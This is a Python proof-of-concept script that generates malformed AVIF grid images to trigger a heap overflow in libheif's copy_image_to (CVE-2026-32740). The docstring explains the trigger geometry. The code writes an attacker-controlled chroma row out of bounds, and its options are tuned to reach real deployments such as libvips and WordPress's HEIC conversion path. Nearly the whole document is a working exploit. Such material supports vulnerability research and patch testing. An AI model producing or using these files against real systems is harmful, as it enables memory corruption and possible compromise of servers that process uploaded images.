#!/usr/bin/env python3
"""
PoC generator for CVE-2026-32740 / GHSA-frfr-f3vg-2g6j:
libheif HeifPixelImage::copy_image_to() grid-tile chroma heap overflow.

Bug (libheif/pixelimage.cc, copy_image_to): for YCbCr 4:2:0 the chroma
destination row `ys = channel_height(y0)` = (y0+1)/2 and
`copy_height = min(src_chroma_h, channel_height(canvas_h - y0))` use
independent ceiling division.  With an ODD tile height, the last grid row
pastes one chroma row past the Cb/Cr plane allocations
(ys + copy_height = chroma_height(canvas_h) + 1).  The OOB bytes are the
tile's final chroma row -> fully attacker-controlled 8-bit data.

Trigger geometry (advisory "Variant 1"): 1-column x 4-row grid of 64x65
4:2:0 AV1 tiles, canvas 64x260.  Tile 4 pastes at y0=195:
ys=(195+1)/2=98, copy_height=min(33, (260-195+1)/2)=33 -> last written
chroma row = 98+33-1 = 130, but chroma_height(260) = 130 (rows 0..129).

File layout: item 1 = 'grid' (primary AND first top-level item, for the
libvips heifload quirk), items 2..N+1 = 'av01' tiles referenced via 'dimg'
in row-major order.  Tile bitstreams are lossless 8-bit AV1 (libaom) with
attacker-chosen Cb/Cr fills, verified bit-exact at generation time.

Usage:
  python3 grid32740_gen.py out.avif [--tile-w 64] [--tile-h 65]
      [--rows 4] [--cols 1] [--canvas-w W] [--canvas-h H]
      [--cb 0x41] [--cr 0x42] [--luma 0x80] [--last-row-ramp]

Defaults produce the PoC (64x65 tiles, 1x4, canvas 64x260).
Benign control: --tile-h 64 (even) -> canvas 64x256, no overflow.
"""

import argparse
import os
import struct
import subprocess
import tempfile


def _iter_boxes(data, start, end):
    """Yield bounded ISO-BMFF boxes from one container range."""
    offset = start
    while offset + 8 <= end:
        size = struct.unpack_from(">I", data, offset)[0]
        box_type = data[offset + 4:offset + 8]
        header_size = 8
        if size == 1:
            size = struct.unpack_from(">Q", data, offset + 8)[0]
            header_size = 16
        elif size == 0:
            size = end - offset
        if size < header_size or offset + size > end:
            break
        yield offset, size, box_type, header_size
        offset += size


def _find_box(data, start, end, box_type):
    for offset, size, candidate, header_size in _iter_boxes(data, start, end):
        if candidate == box_type:
            return offset, size, header_size
    return None


def _extract_av1c_and_sample(path):
    """Return the av1C box and coded sample from a one-item AVIF."""
    with open(path, "rb") as handle:
        data = handle.read()
    meta = _find_box(data, 0, len(data), b"meta")
    if not meta:
        raise RuntimeError("ffmpeg output has no meta box")
    meta_offset, meta_size, meta_header = meta
    child_start = meta_offset + meta_header + 4
    child_end = meta_offset + meta_size

    iprp = _find_box(data, child_start, child_end, b"iprp")
    if not iprp:
        raise RuntimeError("ffmpeg output has no iprp box")
    ipco = _find_box(
        data, iprp[0] + iprp[2], iprp[0] + iprp[1], b"ipco",
    )
    av1c = _find_box(
        data, ipco[0] + ipco[2], ipco[0] + ipco[1], b"av1C",
    )
    av1c_box = data[av1c[0]:av1c[0] + av1c[1]]

    iloc = _find_box(data, child_start, child_end, b"iloc")
    position = iloc[0] + iloc[2] + 4
    offset_size = data[position] >> 4
    length_size = data[position] & 0xF
    base_offset_size = data[position + 1] >> 4
    position += 2
    item_count = struct.unpack_from(">H", data, position)[0]
    position += 2
    sample = None
    for _ in range(item_count):
        position += 4
        base = (
            int.from_bytes(data[position:position + base_offset_size], "big")
            if base_offset_size else 0
        )
        position += base_offset_size
        extent_count = struct.unpack_from(">H", data, position)[0]
        position += 2
        for _ in range(extent_count):
            extent_offset = int.from_bytes(
                data[position:position + offset_size], "big",
            )
            position += offset_size
            extent_length = int.from_bytes(
                data[position:position + length_size], "big",
            )
            position += length_size
            sample = data[
                base + extent_offset:base + extent_offset + extent_length
            ]
    if not sample:
        raise RuntimeError("ffmpeg output has no coded sample")
    return av1c_box, sample


def _box(tag, payload=b""):
    return struct.pack(">I", 8 + len(payload)) + tag + payload


def _fullbox(tag, version, flags, payload=b""):
    return _box(
        tag, struct.pack(">I", (version << 24) | flags) + payload,
    )


def _plane_bytes(w, h, spec):
    if callable(spec):
        return bytes(spec(x, y) & 0xFF for y in range(h) for x in range(w))
    return bytes([spec & 0xFF] * (w * h))


def encode_tile(w, h, luma, cb, cr, last_row_ramp=False, chroma444=False):
    """Lossless 8-bit yuv420p AV1 encode of a WxH frame with chosen plane
    contents; returns path to a temp 1-item AVIF.  Supports odd height via
    AV1 render-size signaling (chroma planes are ceil(W/2) x ceil(H/2)).
    Verified bit-exact (all three planes) against the raw input."""
    cw, ch = (w, h) if chroma444 else ((w + 1) // 2, (h + 1) // 2)
    y_plane = _plane_bytes(w, h, luma)
    cb_plane = bytearray(_plane_bytes(cw, ch, cb))
    cr_plane = bytearray(_plane_bytes(cw, ch, cr))
    if last_row_ramp:
        for x in range(cw):
            cb_plane[(ch - 1) * cw + x] = 0xE0 | (x & 0x0F)
            cr_plane[(ch - 1) * cw + x] = 0xF0 | (x & 0x0F)
    raw = y_plane + bytes(cb_plane) + bytes(cr_plane)

    fd, rawpath = tempfile.mkstemp(suffix=".yuv")
    os.close(fd)
    with open(rawpath, "wb") as f:
        f.write(raw)
    fd, path = tempfile.mkstemp(suffix=".avif")
    os.close(fd)
    try:
        pixel_format = "yuv444p" if chroma444 else "yuv420p"
        subprocess.run([
            "ffmpeg", "-y", "-f", "rawvideo", "-pix_fmt", pixel_format,
            "-s", f"{w}x{h}", "-i", rawpath,
            "-frames:v", "1", "-c:v", "libaom-av1",
            "-still-picture", "1", "-crf", "0", "-aom-params", "lossless=1",
            "-cpu-used", "0",
            "-pix_fmt", pixel_format, "-f", "avif", path,
        ], capture_output=True, check=True)
        dec = subprocess.run([
            "ffmpeg", "-y", "-i", path, "-frames:v", "1",
            "-f", "rawvideo", "-pix_fmt", pixel_format, "-",
        ], capture_output=True, check=True).stdout
        if dec != raw:
            nbad = sum(1 for a, b in zip(dec, raw) if a != b)
            raise RuntimeError(
                f"lossless verification failed for {w}x{h} tile: {nbad} bytes differ")
    finally:
        os.unlink(rawpath)
    return path


def build_grid_avif(tile_w=64, tile_h=65, rows=4, cols=1,
                    canvas_w=None, canvas_h=None,
                    luma=0x80, cb=0x41, cr=0x42, last_row_ramp=False,
                    quiet=False, chroma444=False, heic_brand=False):
    """Assemble the grid AVIF; returns file bytes (4KB-padded)."""
    if canvas_w is None:
        canvas_w = tile_w * cols
    if canvas_h is None:
        canvas_h = tile_h * rows
    n_tiles = rows * cols
    ID_GRID = 1
    tile_ids = list(range(2, 2 + n_tiles))

    if not quiet:
        print(f"[*] Encoding {tile_w}x{tile_h} 8-bit yuv420p tile "
              f"(luma={luma:#x} cb={cb:#x} cr={cr:#x}) ...")
    ftile = encode_tile(tile_w, tile_h, luma, cb, cr, last_row_ramp,
                        chroma444=chroma444)
    try:
        av1c, sample = _extract_av1c_and_sample(ftile)
    finally:
        os.unlink(ftile)

    # grid payload (see ImageGrid::parse): version, flags(bit0=32-bit dims),
    # rows-1, cols-1, output_width, output_height
    if canvas_w > 0xFFFF or canvas_h > 0xFFFF:
        grid_payload = bytes([0, 1, rows - 1, cols - 1]) + \
            struct.pack(">II", canvas_w, canvas_h)
    else:
        grid_payload = bytes([0, 0, rows - 1, cols - 1]) + \
            struct.pack(">HH", canvas_w, canvas_h)

    major = b"heic" if heic_brand else b"avif"
    compat = b"heicmif1miaf" if heic_brand else b"avifmif1miaf"
    ftyp = _box(b"ftyp", major + struct.pack(">I", 0) + compat)

    n_items = 1 + n_tiles

    def assemble(offset_base):
        # extents in mdat: grid payload, then one copy of the tile sample per tile
        extents = [(ID_GRID, grid_payload)] + [(tid, sample) for tid in tile_ids]
        offs = {}
        cur = offset_base
        payload = b""
        for iid, data in extents:
            offs[iid] = (cur, len(data))
            payload += data
            cur += len(data)

        hdlr = _fullbox(b"hdlr", 0, 0,
                        struct.pack(">I", 0) + b"pict" + b"\x00" * 12 + b"\x00")
        pitm = _fullbox(b"pitm", 0, 0, struct.pack(">H", ID_GRID))

        def infe(iid, typ):
            return _fullbox(b"infe", 2, 0,
                            struct.pack(">HH", iid, 0) + typ + b"\x00")
        iinf_entries = infe(ID_GRID, b"grid")
        for tid in tile_ids:
            iinf_entries += infe(tid, b"av01")
        iinf = _fullbox(b"iinf", 0, 0, struct.pack(">H", n_items) + iinf_entries)

        refs = _box(b"dimg", struct.pack(">HH", ID_GRID, len(tile_ids)) +
                    b"".join(struct.pack(">H", t) for t in tile_ids))
        iref = _fullbox(b"iref", 0, 0, refs)

        ispe_grid = _fullbox(b"ispe", 0, 0, struct.pack(">II", canvas_w, canvas_h))
        ispe_tile = _fullbox(b"ispe", 0, 0, struct.pack(">II", tile_w, tile_h))
        pixi = _fullbox(b"pixi", 0, 0, bytes([3, 8, 8, 8]))
        # ipco indices:            1          2          3      4
        ipco = _box(b"ipco", ispe_grid + ispe_tile + av1c + pixi)

        def ipma_e(iid, al):
            return struct.pack(">HB", iid, len(al)) + \
                b"".join(struct.pack("B", ((1 if e else 0) << 7) | (i & 0x7F))
                         for e, i in al)
        entries = ipma_e(ID_GRID, [(0, 1), (1, 4)])          # ispe(canvas) + pixi
        for tid in tile_ids:
            entries += ipma_e(tid, [(0, 2), (1, 3), (1, 4)])  # ispe(tile) + av1C* + pixi*
        ipma = _fullbox(b"ipma", 0, 0, struct.pack(">I", n_items) + entries)
        iprp = _box(b"iprp", ipco + ipma)

        iloc_entries = b""
        for iid in range(1, n_items + 1):
            off, ln = offs[iid]
            iloc_entries += struct.pack(">HHHII", iid, 0, 1, off, ln)
        iloc = _fullbox(b"iloc", 0, 0,
                        struct.pack("BB", 0x44, 0x00) +
                        struct.pack(">H", n_items) + iloc_entries)

        return _fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iref + iprp + iloc), payload

    meta, payload = assemble(0)
    mdat_payload = len(ftyp) + len(meta) + 8
    meta, payload = assemble(mdat_payload)
    assert len(meta) + len(ftyp) + 8 == mdat_payload

    mdat = _box(b"mdat", payload)
    blob = ftyp + meta + mdat
    blob += b"\x00" * (-len(blob) % 4096)   # bounded-source probe padding
    return blob


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("out")
    ap.add_argument("--tile-w", type=int, default=64)
    ap.add_argument("--tile-h", type=int, default=65)
    ap.add_argument("--rows", type=int, default=4)
    ap.add_argument("--cols", type=int, default=1)
    ap.add_argument("--canvas-w", type=int, default=None)
    ap.add_argument("--canvas-h", type=int, default=None)
    ap.add_argument("--luma", type=lambda s: int(s, 0), default=0x80)
    ap.add_argument("--cb", type=lambda s: int(s, 0), default=0x41,
                    help="Cb fill byte (the OOB-written plane content)")
    ap.add_argument("--cr", type=lambda s: int(s, 0), default=0x42,
                    help="Cr fill byte (the OOB-written plane content)")
    ap.add_argument("--last-row-ramp", action="store_true",
                    help="overwrite the final chroma row with a 0xE0./0xF0. ramp")
    ap.add_argument("--heic-brand", action="store_true",
                    help="HEIC-brand the AV1 grid so WordPress takes its HEIC-to-JPEG path")
    args = ap.parse_args()

    blob = build_grid_avif(args.tile_w, args.tile_h, args.rows, args.cols,
                           args.canvas_w, args.canvas_h,
                           args.luma, args.cb, args.cr, args.last_row_ramp,
                           heic_brand=args.heic_brand)
    with open(args.out, "wb") as f:
        f.write(blob)
    cw = args.canvas_w or args.tile_w * args.cols
    ch = args.canvas_h or args.tile_h * args.rows
    print(f"[+] Wrote {args.out} ({len(blob)} bytes): grid {args.cols}x{args.rows} "
          f"of {args.tile_w}x{args.tile_h} tiles, canvas {cw}x{ch}")


if __name__ == "__main__":
    main()
